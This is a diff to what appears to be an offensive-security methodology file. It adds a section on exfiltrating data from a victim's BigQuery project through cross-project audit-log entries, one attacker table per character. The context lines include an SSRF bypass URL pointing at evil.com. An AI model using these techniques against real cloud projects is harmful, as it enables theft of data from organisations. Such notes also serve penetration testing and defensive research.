@@ -338,6 +338,12 @@ http://169.254.169.254:80@evil.com/
 - Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
 - Chain with other bugs that leak response data (e.g., error messages, logs)
 
+### Cross-project audit-log "ping" exfil (BigQuery/Looker Studio class — no data perms needed)
+When injected SQL runs in the VICTIM's project and you have no write/insert permission anywhere:
+1. Pre-create empty attacker tables named per character (`exfil-a`, `exfil-b`, ... `exfil-1`) in YOUR project, grant cross-project query access.
+2. In the victim-side injected script, for each extracted character execute `SELECT * FROM attacker_project.exfil-<char>` — the read fails/returns nothing but generates an AUDIT LOG entry in YOUR project.
+3. Monitor your own GCP audit logs; the sequence of table accesses reconstructs the victim's data char-by-char (column names, then row values). Works because audit logs are attacker-readable even when data permissions are absent.
+
 ---
 
 ## Gate 0 Validation
